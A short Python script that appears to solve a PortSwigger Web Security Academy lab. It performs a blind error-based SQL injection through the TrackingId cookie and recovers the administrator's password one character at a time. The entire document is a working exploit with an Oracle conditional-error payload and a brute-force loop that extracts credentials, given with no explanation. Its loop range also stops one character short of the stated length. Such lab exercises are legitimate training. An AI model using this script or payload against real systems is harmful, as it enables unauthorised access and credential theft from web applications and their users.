import requests
from colorama import Fore,Style
import string

url = "https://0a4700f903652098808b127f00fd0018.web-security-academy.net/"
def brute(value):
    cookies = {'TrackingId':f"BxmfuPaZtSZER6Vj'{value}"}
    requestor = requests.get(url,cookies=cookies)
    return requestor.status_code

Passwd_Len = 21
char = string.ascii_letters+ string.digits
passwd = ""
for i in range(1,Passwd_Len):
    for c in char:
        condition = f"username = 'administrator' and (SUBSTR(password,{i},1) = '{c}')"
        query = f" AND (SELECT CASE WHEN ({condition}) THEN 'a' ELSE To_CHAR(1/0) END FROM users where username = 'administrator')='a'--"
        if (brute(query) == 200):
            passwd+=c
            print(f"{Fore.GREEN} [+] correct character : injecting {c} in to position {i} ")
            break
        else:
            print (f"{Fore.RED} [-] wrong character : injecting {c} in to position {i}")
            pass
print(f"{Fore.CYAN} [+++] Password is  {passwd}")